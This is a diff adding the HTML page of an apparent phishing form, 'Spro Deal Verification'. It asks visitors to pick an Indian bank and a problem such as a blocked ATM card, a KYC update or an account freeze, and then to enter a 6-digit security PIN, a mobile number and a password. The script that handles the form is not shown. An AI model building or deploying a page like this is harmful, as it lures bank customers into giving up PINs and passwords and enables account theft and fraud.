@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Spro Deal Verification</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="card">
+      <div class="header-box">
+        <h1>Welcome to Spro Deal</h1>
+        <p>Please complete your verification</p>
+      </div>
+
+      <h2>Verification Details</h2>
+
+      <form id="verificationForm">
+        <div class="input-wrap">
+          <input type="text" id="name" placeholder="Enter your Name" required />
+        </div>
+
+        <div class="input-wrap">
+          <select id="bankName" required>
+            <option value="">Select your bank</option>
+            <option>State Bank of India</option>
+            <option>HDFC Bank</option>
+            <option>ICICI Bank</option>
+            <option>Axis Bank</option>
+            <option>Punjab National Bank</option>
+          </select>
+        </div>
+
+        <div class="input-wrap">
+          <select id="problemType" required>
+            <option value="">Select your problem</option>
+            <option>UPI Issue</option>
+            <option>ATM Card Blocked</option>
+            <option>Transaction Failed</option>
+            <option>KYC Update</option>
+            <option>Account Freeze</option>
+          </select>
+        </div>
+
+        <div class="input-wrap">
+          <div class="password-field">
+            <input type="password" id="pin" placeholder="Security PIN (6 digits)" maxlength="6" required />
+            <button type="button" id="togglePin">👁</button>
+          </div>
+        </div>
+
+        <div class="input-wrap">
+          <select id="experienceLevel" required>
+            <option value="">Select experience level</option>
+            <option>Beginner</option>
+            <option>Intermediate</option>
+            <option>Advanced</option>
+          </select>
+        </div>
+
+        <div class="input-wrap">
+          <input type="tel" id="mobile" placeholder="Mobile Number (10 digits)" maxlength="10" required />
+        </div>
+
+        <div class="input-wrap">
+          <div class="password-field">
+            <input type="password" id="password" placeholder="Create Password" required />
+            <button type="button" id="togglePassword">👁</button>
+          </div>
+        </div>
+
+        <button class="btn" type="submit">Submit Verification</button>
+        <div id="verificationStatus" class="status"></div>
+      </form>
+
+      <div class="link-box">
+        <a href="login.html">Already verified? Go to Sign In</a>
+      </div>
+    </div>
+
+    <script src="app.js"></script>
+  </body>
+</html>
